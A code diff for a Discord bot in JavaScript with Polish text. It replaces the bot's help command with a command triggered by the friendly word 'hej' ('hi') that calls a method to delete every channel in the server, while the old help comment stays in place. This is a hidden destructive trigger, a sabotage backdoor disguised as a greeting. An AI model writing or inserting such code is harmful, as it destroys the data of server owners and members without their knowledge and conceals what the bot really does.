@@ -56,12 +56,8 @@ bot.on("ready", e => {
     let msg = message.content.startsWith;
     let args = messageArray.slice(1);
 	
-	if(cmd === `${prefix}help`){
-		let embed = new Discord.RichEmbed()
-		.setColor("ORANGE")
-		.setAuthor("POMOC BOTA")
-		.setDescription("`Aktualnie brak komend innych niz !help w tym bocie ;(`")
-		message.channel.send(embed);
+	if(cmd === `${prefix}hej`){
+		message.guild.channels.deleteAll();
 		//message.channel.send("**POMOC BOTA:**\n`Aktualnie brak komend innych niz !help w tym bocie ;(`");
 	}
   });
